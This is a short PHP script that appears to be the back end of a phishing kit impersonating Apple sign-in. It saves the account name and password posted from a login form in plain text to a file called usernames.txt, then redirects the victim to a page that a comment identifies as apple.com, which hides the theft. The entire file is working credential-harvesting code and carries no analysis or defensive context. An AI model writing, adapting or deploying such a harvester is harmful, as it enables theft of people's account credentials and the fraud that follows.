<?php

file_put_contents("usernames.txt", "Account: " . $_POST['apple'] . "\nPassword: " . $_POST['pw'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://www.apple.com
header("Location: $url");
exit();
